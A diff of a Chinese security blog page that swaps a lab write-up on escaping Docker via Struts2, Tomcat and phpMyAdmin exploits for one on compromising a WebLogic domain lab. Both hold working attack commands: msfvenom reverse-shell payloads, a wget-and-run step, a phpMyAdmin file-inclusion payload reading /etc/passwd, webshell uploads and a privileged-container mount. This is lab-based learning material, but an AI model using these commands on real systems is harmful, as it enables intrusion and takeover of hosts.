@@ -19,90 +19,70 @@
         <meta name="keywords" content="Drunkmars,Drunkmars-theme,Drunkmars-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="本文首发于先知社区：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;9966 记一次docker逃逸拿shell的靶场渗透。">
+    <meta name="description" content="本文首发于先知社区：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;9851 记一次靶场渗透。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="记一次docker逃逸学习">
-<meta property="og:url" content="http://example.com/2021/08/09/%E8%AE%B0%E4%B8%80%E6%AC%A1docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:title" content="红日靶场2">
+<meta property="og:url" content="http://example.com/2021/07/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html">
 <meta property="og:site_name" content="Drunkmars">
-<meta property="og:description" content="本文首发于先知社区：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;9966 记一次docker逃逸拿shell的靶场渗透。">
+<meta property="og:description" content="本文首发于先知社区：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;9851 记一次靶场渗透。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709093338103.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709094220926.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709094558126.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709094725911.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709094750761.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709094804696.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709100008681.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709100001953.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709103027210.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709103920338.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709104023644.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709104043167.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709104200614.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709105746339.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709110118973.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709111928807.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709112254051.png">
-<meta property="og:image" content="http://example.com/images/attck4/22-2.png">
-<meta property="og:image" content="http://example.com/images/attck4/22-3.png">
-<meta property="og:image" content="http://example.com/images/attck4/22-4.png">
-<meta property="og:image" content="http://example.com/images/attck4/22-5.png">
-<meta property="og:image" content="http://example.com/images/attck4/22-6.png">
-<meta property="og:image" content="http://example.com/images/attck4/22-7.png">
-<meta property="og:image" content="http://example.com/images/attck4/22-8.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709113358517.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709113935599.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709114117955.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210709114312577.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711202608092.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711202741289.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210710151826541.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210710151841967.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210710151854059.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210710152022182.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210710152216143.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210710152301278.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210710152309466.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210710152531088.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210710153607718.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210710153833975.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210710153906276.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210710154126238.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210710154357652.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210710154625500.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711164727185.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711164908165.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711164916229.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711165022348.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711165134837.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711165731902.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711165951971.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711170007140.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711213023199.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711213052863.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711170643083.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711170714848.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711171102615.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711171213256.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711171322209.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711171343659.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711175143843.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711175602085.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711175735504.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711175843340.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711175954197.png">
-<meta property="og:image" content="http://example.com/images/attck4/image-20210711180651437.png">
-<meta property="article:published_time" content="2021-08-08T16:00:00.000Z">
-<meta property="article:modified_time" content="2021-10-03T09:45:49.217Z">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707193456627.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707193541891.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707193601504.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707193803883.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707193824312.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707193844656.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707193902665.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707193934151.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707193959396.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707194110828.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707194156414.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707194241888.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707194405981.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707194527522.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707194612575.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707194842917.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707195135482.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707195212367.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707195315930.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707215623196.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707220400495.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707203431746.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707203936194.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707211428347.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707211432290.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707221739681.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707221926832.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707212821344.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707212907721.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707213444768.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707213513490.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707215226861.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707222112599.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707222133082.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707222309401.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707222548552.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707222553760.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707223442558.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707223341691.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707223421795.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707223656487.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707224258327.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707224414333.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707224512621.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707224936180.png">
+<meta property="og:image" content="http://example.com/images/attck2/image-20210707225039985.png">
+<meta property="article:published_time" content="2021-07-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-04T02:37:20.296Z">
 <meta property="article:author" content="Drunkmars">
 <meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/attck4/image-20210709093338103.png">
+<meta name="twitter:image" content="http://example.com/images/attck2/image-20210707193456627.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/Drunkmars.ico">
     
-    <title>记一次docker逃逸学习 · Drunkmars&#39;s Blog</title>
+    <title>红日靶场2 · Drunkmars&#39;s Blog</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -327,7 +307,7 @@
                 <a href="/">Drunkmars&#39;s Blog</a>
             </div>
             <div class="post-title header-element">
-                <a href="#" class="post-name">记一次docker逃逸学习</a>
+                <a href="#" class="post-name">红日靶场2</a>
             </div>
         </div>
     
@@ -373,7 +353,7 @@
         <h1 class="intro-title">
             <!-- 主页  -->
             
-                记一次docker逃逸学习
+                红日靶场2
             <!-- 404 -->
             
         </h1>
@@ -400,13 +380,13 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">3.3k</span>阅读时长: <span class="post-count reading-time">12 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.4k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <!-- 撰写日期 -->
                     <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2021/08/09</span>
+                    <span class="post-intro-time">2021/07/21</span>
                     <!-- busuanzi -->
                     
                         <span id="busuanzi_container_page_pv" class="busuanzi-pv">
@@ -561,314 +541,174 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <p><strong>本文首发于先知社区：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9966">https://xz.aliyun.com/t/9966</a></strong></p>
-<p>记一次docker逃逸拿shell的靶场渗透。</p>
+        <p><strong>本文首发于先知社区：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9851">https://xz.aliyun.com/t/9851</a></strong></p>
+<p>记一次靶场渗透。</p>
 <span id="more"></span>
 
 
 
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>靶场：</p>
-<p>ubuntu</p>
-<p>内网ip：192.168.183.10</p>
-<p>外网ip：192.168.1.6</p>
-<p>域内主机：</p>
-<p>win7：192.168.183.129</p>
-<p>win2008：192.168.183.130</p>
-<p>需手动开启ubuntu的docker环境，对应的端口服务如下</p>
-<blockquote>
-<p>2001 struts2</p>
-<p>2002 tomcat8</p>
-<p>2003 phpmyadmin 4.8.1</p>
-</blockquote>
-<p><img src="/images/attck4/image-20210709093338103.png" alt="image-20210709093338103"></p>
-<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先对ubuntu进行端口扫描，发现2001、2002、2003三个特征端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV 192.168.1.6</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="/images/attck4/image-20210709094220926.png" alt="image-20210709094220926"></p>
-<h2 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h2><p>首先访问2001端口，是一个struts2的框架</p>
-<p><img src="/images/attck4/image-20210709094558126.png" alt="image-20210709094558126"></p>
-<p>这里直接使用漏扫工具检测struts2有无漏洞，这里发现存在S2-045、S2-046两个漏洞</p>
-<p><img src="/images/attck4/image-20210709094725911.png" alt="image-20210709094725911"></p>
-<p>首先使用S2-045看能不能命令执行，这里发现返回的是html</p>
-<p><img src="/images/attck4/image-20210709094750761.png" alt="image-20210709094750761"></p>
-<p>再换一个S2-046漏洞发现能够命令回显</p>
-<p><img src="/images/attck4/image-20210709094804696.png" alt="image-20210709094804696"></p>
-<p>这里直接尝试上传一个jsp上去试试，返回了路径</p>
-<p><img src="/images/attck4/image-20210709100008681.png" alt="image-20210709100008681"></p>
-<p>这里访问一下，返回了404，这里我尝试了其他几个路径都是返回404，但是S2-046这个漏洞应该是能拿到shell的，这里这个端口就没继续进行尝试了</p>
-<p><img src="/images/attck4/image-20210709100001953.png" alt="image-20210709100001953"></p>
-<h2 id="Tomcat8"><a href="#Tomcat8" class="headerlink" title="Tomcat8"></a>Tomcat8</h2><p>看一下2002端口是一个apache tomcat8</p>
-<p><img src="/images/attck4/image-20210709103027210.png" alt="image-20210709103027210"></p>
-<p>这里直接去kali上搜索对应版本的漏洞并把漏洞检测的poc复制出来</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit tomcat 8.5.19</span><br><span class="line"></span><br><span class="line">searchsploit -m /exploit/jsp/webapps/42966.py</span><br></pre></td></tr></table></figure>
 
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>web：</p>
+<p>外网ip - 192.168.10.80</p>
+<p>内网ip - 10.10.10.80</p>
+<p>PC：</p>
+<p>外网ip - 192.168.10.201</p>
+<p>内网ip - 10.10.10.201</p>
+<p>DC：</p>
+<p>内网ip - 10.10.10.10</p>
+<p>web、PC、DC都处于同一域环境内，需要手动开启weblogic服务</p>
+<h1 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h1><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>首先nmap扫描一下端口发现了1433端口判断是sql server，另外一个特征端口就是7001端口，判断为weblogic端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV 192.168.10.80</span><br></pre></td></tr></table></figure>
 
 
-<p><img src="/images/attck4/image-20210709103920338.png" alt="image-20210709103920338"></p>
-<p>使用poc检测是否存在漏洞，这里发现是存在CVE-2017-12617这个漏洞的，这里的poc原理应该是上传了一个Poc.jsp来判断是否存在漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 42966.py -u http://192.168.1.6:2002/</span><br></pre></td></tr></table></figure>
 
+<p><img src="/images/attck2/image-20210707193456627.png" alt="image-20210707193456627"></p>
+<h2 id="weblogic-getshell"><a href="#weblogic-getshell" class="headerlink" title="weblogic getshell"></a>weblogic getshell</h2><p>这里访问一下weblogic所在的7001端口，注意这里直接访问7001端口会显示404，这里直接访问<code>192.168.10.80:7001/console</code>即可</p>
+<p><img src="/images/attck2/image-20210707193541891.png" alt="image-20210707193541891"></p>
+<p>首先尝试一下控制台弱口令<code>weblogic weblogic</code>无果</p>
+<p><img src="/images/attck2/image-20210707193601504.png" alt="image-20210707193601504"></p>
+<p>这里直接使用weblogic漏洞检测工具，也可以使用weblogic批量扫描脚本去扫描，扫描发现存在几个反序列化漏洞</p>
+<p><img src="/images/attck2/image-20210707193803883.png" alt="image-20210707193803883"></p>
+<p>这里我是用<code>CVE-2017-10271</code>进行命令执行发现为administrator权限</p>
+<p><img src="/images/attck2/image-20210707193824312.png" alt="image-20210707193824312"></p>
+<p>查看ip情况为双网卡，初步判断有域环境</p>
+<p><img src="/images/attck2/image-20210707193844656.png" alt="image-20210707193844656"></p>
+<p><code>tasklist /svc</code>查看一下进程发现了360主动防御，那么后面的马就需要做免杀处理</p>
+<p><img src="/images/attck2/image-20210707193902665.png" alt="image-20210707193902665"></p>
+<p>这里直接使用漏扫工具中自带的jsp马先上传进行尝试</p>
+<p><img src="/images/attck2/image-20210707193934151.png" alt="image-20210707193934151"></p>
+<p>访问一下能够访问到，那么已经上传成功</p>
+<p><img src="/images/attck2/image-20210707193959396.png" alt="image-20210707193959396"></p>
+<p>使用蚁剑尝试连接失败，这里我觉得可能是有360的原因，而jsp的马在蚁剑默认是没有加密解密器的，所以应该是被360给拦了</p>
+<p><img src="/images/attck2/image-20210707194110828.png" alt="image-20210707194110828"></p>
+<p>这里我换一个冰蝎的马传上去试试</p>
+<p><img src="/images/attck2/image-20210707194156414.png" alt="image-20210707194156414"></p>
+<p>使用冰蝎连接成功</p>
+<p><img src="/images/attck2/image-20210707194241888.png" alt="image-20210707194241888"></p>
+<p>初步做一下信息搜集，发现DNS为<code>de1ay.com</code>，应该这个就是域的名称</p>
+<p><img src="/images/attck2/image-20210707194405981.png" alt="image-20210707194405981"></p>
+<h2 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h2><p>这里首先生成一个msf的马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.30 lport=4444 -f exe &gt; msf.exe</span><br></pre></td></tr></table></figure>
 
 
 
 
-<p><img src="/images/attck4/image-20210709104023644.png" alt="image-20210709104023644"></p>
-<p>我们访问一下Poc.jsp，是存在的</p>
-<p><img src="/images/attck4/image-20210709104043167.png" alt="image-20210709104043167"></p>
-<p>那么存在漏洞，直接使用<code>-p</code>参数进行攻击，这里拿到了一个反弹回来的shell，这里因为是交互型shell，不太方便下一步的操作，这里尝试着上线msf</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 42966.py -u http://192.168.1.6:2002/ -p pwn</span><br></pre></td></tr></table></figure>
 
-
-
-<p><img src="/images/attck4/image-20210709104200614.png" alt="image-20210709104200614"></p>
-<p>因为是linux，所以需要生成linux的木马，在kali本地起一个http服务方便靶机下载</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer	#py2环境</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p><img src="/images/attck4/image-20210709105746339.png" alt="image-20210709105746339"></p>
-<p>下载shell.elf并赋权执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.1.10:8000/shell.elf</span><br><span class="line"></span><br><span class="line">chmod 777 shell.elf</span><br><span class="line"></span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210709110118973.png" alt="image-20210709110118973"></p>
-<p>使用msf接收会话，上线成功</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set payload linux/x86/meterpreter/reverse_tcppayload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.10</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210709111928807.png" alt="image-20210709111928807"></p>
-<h2 id="phpmyadmin4-8-1"><a href="#phpmyadmin4-8-1" class="headerlink" title="phpmyadmin4.8.1"></a>phpmyadmin4.8.1</h2><p>访问2003端口是一个直接暴露的phpmyadmin</p>
-<p><img src="/images/attck4/image-20210709112254051.png" alt="image-20210709112254051"></p>
-<p>这里对应版本的漏洞是CVE-2018-12613，是一个文件包含的漏洞，这里看一下漏洞的分析</p>
-<p>首先在如下图所示的index.php中存在一处包含指定文件的代码：</p>
-<p><img src="/images/attck4/22-2.png" alt="22-2"></p>
-<p>需要成功包含，必须满足if区间中的五个条件：target参数值不为空；target参数值为字符串；target参数值不以index开头；target参数值不在黑名单中；过checkPageValidity函数的检查。其中第四个条件的黑名单即51行中import.php与export.php；第五个条件需要查看该函数：</p>
-<p><img src="/images/attck4/22-3.png" alt="22-3"></p>
-<p>可以看到core类的checkPageValidity函数中又必须经过以下的五个判断：</p>
-<p>1、$whitelist为空就引用申明的$goto_whitelist<br>2、$page如果没有定义或者$page不为字符串就返回false<br>3、$page如果存在在$whitelist中返回true<br>4、如果$_page存在在$whitelist中返回true<br>5、经过urldecode函数解码后的$_page存在在$whitelist中返回true</p>
-<p>我们可以看到在index.php调用checkPageValidity函数时没有传入其他参数，因此会进入第一个判断，而$goto_whitelist如下所示：</p>
-<p><img src="/images/attck4/22-4.png" alt="22-4"></p>
-<p>它定义了很多可以被包含的文件名。然后第二个判断可以跳过；看第三个判断，可以看到$page参数是不在$whitelist中的，此处不满足；看第四个判断，这个判断是对$_page进行的，校验$_page是否在白名单中，而$_page是将$page值末尾加上’?’后从字符串第0位开始分割，取其中第一次出现?之前的内容，如下图所示：target=sql.ph%3fp时：</p>
-<p><img src="/images/attck4/22-5.png" alt="22-5"></p>
-<p>因此此处可以用’$target=db_sql.php?/../../被包含文件’来满足条件，但是$target进入到index.php的include()中，被包含的文件无法打开，出现报错。（windows文件命名规则中规定了文件名不能出现特殊字符，linux为服务器的情况下，是可以使用？直接进行绕过)</p>
-<p><img src="/images/attck4/22-6.png" alt="22-6"></p>
-<p>第五个判断，先将$page进行urldecode解码，然后再进行？的分割，取值进行判断，只要解码后分割出来的值在$whitelist中即可满足条件。而在$target 里问号被二次编码为%253f， db_sql.php%253f也会被认为是一个目录，可以用../跨越，成功实现包含。因此命名规范里面没有将%放进去也是该漏洞能在windows下成功利用的一个关键点。</p>
-<p><img src="/images/attck4/22-7.png" alt="22-7"></p>
-<p>这样我们可以将？进行二次编码。如果传入target=db_sql.php%253f。在第四个判断中进行白名单校验时，为db_sql.php%3f，不满足，第五个判断的urldecode后，进行校验时为db_sql.php,符合条件，然后即可成功包含文件。</p>
-<p><img src="/images/attck4/22-8.png" alt="22-8"></p>
-<p>这里就可以构造一个payload输出密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210709113358517.png" alt="image-20210709113358517"></p>
-<p>这里首先写入一个phpinfo，然后查看<code>phpMyAdmin</code>的value</p>
-<p><img src="/images/attck4/image-20210709113935599.png" alt="image-20210709113935599"></p>
-<p>得到phpMyAdmin：”990aadb371d8e582cb000c716aed9720”，然后构造payload进行文件包含输出phpinfo</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_datadict.php%253f/../../../../../../../../../tmp/sess_990aadb371d8e582cb000c716aed9720</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210709114117955.png" alt="image-20210709114117955"></p>
-<p>写入一句话木马查看phpMyAdmin的值然后构造payload进行文件包含用蚁剑连接即可</p>
-<p>phpMyAdmin:”990aadb371d8e582cb000c716aed9720”</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_datadict.php%253f/../../../../../../../../../tmp/sess_990aadb371d8e582cb000c716aed9720</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p><img src="/images/attck4/image-20210709114312577.png" alt="image-20210709114312577"></p>
-<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>这里理论上三种方法都能够拿到shell，这里我使用tomcat上线到msf的shell进行信息搜集</p>
-<p>可以看到有eth0、eth1分别处于1.0/24和183.0/24两个网段，初步判断是有域环境的。</p>
-<p><img src="/images/attck4/image-20210711202608092.png" alt="image-20210711202608092"></p>
-<p>继续往下看，还有几个ip，但是不是eth，而且这里有三个ip，根据上面有三个不同的环境，那么可以判断应该是用的docker。那么我们无论使用3个环境的哪个环境拿shell都只是一个docker容器里面的shell，并不是真正ubuntu的shell，所以这里我们还需要进行docker逃逸到ubuntu</p>
-<p><img src="/images/attck4/image-20210711202741289.png" alt="image-20210711202741289"></p>
-<p>这里我尝试脏牛失败，这里就需要使用到privileged特权模式逃逸</p>
-<h3 id="privileged特权模式逃逸"><a href="#privileged特权模式逃逸" class="headerlink" title="privileged特权模式逃逸"></a>privileged特权模式逃逸</h3><p>docker中提供了一个<code>--privileged</code>参数，这个参数本身最初的目的是为了提供在docker中运行docker的能力<br><a target="_blank" rel="noopener" href="https://www.docker.com/blog/docker-can-now-run-within-docker/">https://www.docker.com/blog/docker-can-now-run-within-docker/</a></p>
-<p>docker文档中对这个参数的解释如下<br><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities">https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities</a></p>
-<blockquote>
-<p>当操作员执行时docker run –privileged，Docker将启用对主机上所有设备的访问，并在AppArmor或SELinux中进行一些配置，以允许容器对主机的访问几乎与在主机上容器外部运行的进程相同。</p>
-</blockquote>
-<p>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。那么这里就可以尝试使用特权模式写入ssh私钥，使用ssh免密登录</p>
-<p>这里首先新建一个tmptest文件夹，用来存放挂载后的docker</p>
-<p><img src="/images/attck4/image-20210710151826541.png" alt="image-20210710151826541"></p>
-<p>查看一下dev文件夹里面的设备文件</p>
-<p><img src="/images/attck4/image-20210710151841967.png" alt="image-20210710151841967"></p>
-<p>可以看到有四个sda设备文件，我这里选择sda1进行挂载</p>
-<p><img src="/images/attck4/image-20210710151854059.png" alt="image-20210710151854059"></p>
-<p>使用mount命令将sda1挂载到tmptest文件夹里并用ls指令进行查看</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /tmptest</span><br><span class="line">ls /tmptest</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210710152022182.png" alt="image-20210710152022182"></p>
-<p>然后使用ssh生成一个名叫tmp的私钥，然后用chmod命令赋予权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f tmp</span><br><span class="line">chomd 600 tmp</span><br><span class="line">cat tmp.pub</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210710152216143.png" alt="image-20210710152216143"></p>
-<p>因为我们之前已经把sda1挂载成功了，那么我们如果要访问ubuntu的/home目录，我们直接访问挂载到的tmptest文件夹的/home文件夹即可，即/tmptest/home路径</p>
-<p><img src="/images/attck4/image-20210710152301278.png" alt="image-20210710152301278"></p>
-<p>使用ls -alh查看当前目录下包括隐藏文件在内的所有文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /tmptest/home/ubuntu</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210710152309466.png" alt="image-20210710152309466"></p>
-<p>这里我们看到了一个.ssh文件，我们要将ssh私钥写入到.ssh目录里面并将文件命名为authorized_keys（目标机.ssh目录权限必须为700）</p>
-<p>使用如下命令写入ssh私钥</p>
